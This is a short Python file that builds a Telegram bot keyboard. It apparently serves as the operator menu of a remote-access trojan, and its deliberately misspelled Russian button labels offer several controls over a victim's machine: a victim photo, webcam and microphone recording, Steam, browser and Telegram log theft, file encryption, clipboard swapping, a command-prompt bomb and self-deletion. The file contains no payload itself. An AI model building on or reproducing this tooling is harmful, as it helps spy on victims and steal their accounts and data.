from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

buttons = ReplyKeyboardMarkup(resize_keyboard=True)

list_of_commands = [
'СКРNH ГРИН', 'АНТNBИРУСЫ ХУNPYСЫ', 
'ВСЕ ДАННNE', 'Ф0ТО МАМОНТА', 
'ОТКРЫТЬ ССЫЛКY', 'ДNPЕКТОРИЯ', 
'С0ДЕРЖАНNE ДИРЕКТОРИИ', 
'С0ЗДАТЬ ПАПКУ', 'УДАЛNTЬ ПАПКУ',
'0КНО С Т3КСТОМ', 'УДАЛNTЬ ФАЙЛ',
'СКАhАТЬ ФАЙЛ', 'ЗАПNCЬ ВЕБКИ',
'ЗАПNCЬ МИКРО', 'ЗАПУСТNТЬ ФАЙЛ',
'ЗВУК НА 1ОО%', 'ВЫКЛЮЧNTЬ ЗВУК',
'ВЫКЛЮЧNTЬ ПК', 'П3РЕЗАГРУЗNTЬ ПК',
'ALT + F4', 'СВ3РНУТЬ 0КНА',
'СВ3СТИ С УМА КУРС0Р', 'П0МЕНЯТЬ ОБ0И',
'ПЕРЕМЕСТNTЬ ВNPYC', 'ПЕРЕNMEHOBATЬ ФАЙЛ',
'РАЗМ3Р ФАЙЛА', 'ЗАШNФРОВАТЬ ФАЙЛ',
'РАСШИФРОВАТЬ ФАNV', 'Л0ГИ STEAM',
'Л0ГИ СHR0ME', 'Л0ГИ 0PERA',
'Л0ГИ TELEGRAM','БЕЗН0ГNM',
'ПЕРЕМЕСТNTЬ ФАЙЛ', 'ЗАБЛ0КИРОВАТЬ КЛАВNАТУРУ',
'СКАЧАТЬ ПАПКY', 'БУФ3Р ОБМЕНА', 
'СМЕНNТЬ БУФЕР ОБМЕНА', 'СПNC0К ПР0ЦЕССОВ', 
'ЗАКРЫТЬ ПР0ЦЕСС', 'ЗАКРЫТЬ ДNCПЕТЧЕР ЗАДАЧ', 
'В0СПРОИЗВЕСТИ ТЕКСТ', 'CMD Б0МБА', 
'САМ0ВЫПNV', '0ТКРЫТЬ DVD', 
'ЗАКРЫТЬ DVD', 'П0ВЕРНУТЬ М0НИК', 'НАП3ЧАТАТЬ ТЕКСТ'
 '', '']

for i in range(1, len(list_of_commands), 2):
	buttons.row(
		KeyboardButton(list_of_commands[i]),
		KeyboardButton(list_of_commands[i - 1])
	)

# БЕЙТЕ ПО ЦЕНТРАМ ПРИНЯТИЯ РЕШЕНИЙ